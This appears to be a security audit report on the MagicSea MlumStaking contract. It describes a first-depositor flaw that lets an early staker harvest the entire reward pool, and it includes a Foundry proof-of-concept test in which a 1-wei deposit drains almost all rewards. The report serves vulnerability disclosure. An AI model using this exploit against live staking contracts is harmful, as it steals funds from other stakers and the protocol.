# The first position creator in `MLUMStaking` can take all the rewards

## Summary
Before each creation/change of a position or reward Harvest, updatePool is called, which should update accRewardPerShare for correct calculation of rewards. However, in the situation when stakedSupply == 0 - i.e. at the moment of the first deposit, accRewardPerShare is not updated, and the _updatePool function simply [return](https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol#L581).

Thus, the first depositor gets a zero rewardDebt, which in turn makes [pendingReward = rewardToken.balanceOf(pool)](https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol#L678)

Thus, the first depositor can withdraw all rewards from the protocol in a single transaction at minimal cost.
## Vulnerability Detail
A simple POC to the file MlumStaking.t.sol that shows that given two unequal deposits, the first depositor takes the entire reward from the protocol

```solidity
    function testFirstDepositorStealFunds() public {
        _rewardToken.mint(address(_pool), 100_000_000);
        _stakingToken.mint(ALICE, 2 ether);
        _stakingToken.mint(BOB, 4 ether);

        vm.startPrank(ALICE);
        _stakingToken.approve(address(_pool), 1 wei);
        _pool.createPosition(1 wei, 1 days);
        vm.stopPrank();

        vm.startPrank(BOB);
        _stakingToken.approve(address(_pool), 4 ether);
        _pool.createPosition(4 ether, 365 days);
        vm.stopPrank();

        skip(3600);

        vm.prank(ALICE);
        _pool.harvestPosition(1);

        assertLt(_rewardToken.balanceOf(address(_pool)), 2);
        assertGt(_rewardToken.balanceOf(ALICE), 100_000_000 - 2);
    }
```
## Impact
I haven't heard from the developers whether this behavior is expected, also the documentation doesn't say anything about it, but considering that the whole attack can be done in one transaction - `createPosition` and then immediately `harvestRewards`, I doubt that this behavior is expected.

Also, I didn't find any counter to this attack in the deploy script.

Score: High
## Code Snippet
```solidity
function _updatePool() internal {
....
    if (lastRewardBalance == rewardBalance || _stakedSupply == 0) {
            return;
    }
....
```

Manual Review

## Recommendation
Make your own first deposit of any size when you deploy the contract.
